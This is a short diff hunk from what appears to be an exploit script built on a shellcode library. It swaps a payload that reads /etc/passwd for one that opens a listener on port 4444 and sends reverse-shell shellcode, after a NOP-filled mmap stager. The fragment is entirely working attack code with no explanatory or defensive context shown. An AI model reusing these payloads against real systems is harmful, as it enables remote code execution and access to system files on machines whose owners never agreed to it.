@@ -29,5 +29,5 @@ buf += sc.nopfill('mmap_stager', 600, buf)
 
 p.write(buf)
 p.write_p64(0)
-p.write(sc.cat('/etc/passwd'))
-p.interact(shell=False)
+with p.listen(4444) as port:
+    p.write(sc.reverse_shell(host='localhost', port=port))
